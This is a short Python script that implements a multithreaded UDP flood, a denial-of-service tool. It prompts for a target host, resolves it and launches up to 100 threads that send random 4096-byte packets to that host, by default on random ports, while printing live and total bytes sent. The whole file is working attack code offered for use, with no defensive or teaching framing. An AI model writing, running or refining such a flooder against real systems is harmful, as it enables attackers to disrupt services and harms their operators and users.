import threading
import random
import socket
import time

class vars:
    max_threads: int = 100
    pkt_size: int = 4096
    timeout: int = 2
    delay: int = 1
    randomize_port: bool = True

    active_threads: int = 0
    pks: int = 0

    total_pks: int = 0

    status_code: int = 0

def flood(host: str, port: int) -> None:
    try:
        vars.active_threads += 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(vars.timeout)
        while vars.status_code == 0:
            packet = random._urandom(vars.pkt_size)
            if port == "random":
                port = random.randrange(1, 65536)
            sent = sock.sendto(packet, (host, port))
            vars.pks += sent
            vars.total_pks += sent
            time.sleep(vars.delay)
    except Exception:
        pass
    finally:
        vars.active_threads -= 1

def attack_initializer(host: str, port: int) -> None:
    try:
        while True:
            if vars.active_threads >= vars.max_threads:
                continue
            threading.Thread(target=flood, args=[host, port], daemon=True).start()
    except Exception:
        pass
    finally:
        vars.status_code = 1

def bytecount(bytesize: int) -> str:
    if bytesize >= 1000000000000:
        total = f"{(bytesize / 1000000000000):.2f} TB"
    elif bytesize >= 1000000000:
        total = f"{(bytesize / 1000000000):.2f} GB"
    elif bytesize >= 1000000:
        total = f"{(bytesize / 1000000):.2f} MB"
    elif bytesize >= 1000:
        total = f"{(bytesize / 1000):.2f} kB"
    else:
        total = f"{(bytesize):.2f} B"
    return total

def main():
    try:
        host = input("Host: ")
        if vars.randomize_port:
            port = "random"
        else:
            port = int(input("Port: "))
        host = socket.gethostbyname(host)
        threading.Thread(target=attack_initializer, args=[host, port], daemon=True).start()
        while True:
            if vars.status_code != 0:
                if vars.status_code == 1:
                    print(f"[PROGRAM] -> ERROR: ATTACK INITIALIZER HAS BEEN STOPPED")
                    break
                else:
                    print(f"[PROGRAM] -> ERROR: UNKOWN ERROR")
                    break
            print(f"T -> {vars.active_threads}; P -> {bytecount(vars.pks)};")
            vars.pks = 0
            time.sleep(1)
    except KeyboardInterrupt:
        exit()
    finally:
        vars.status_code = 1
        print(f"\r\n\r\n[STATISTICS]\r\nT_PKS -> {bytecount(vars.total_pks)}\r\n")

if __name__ == "__main__":
    main()
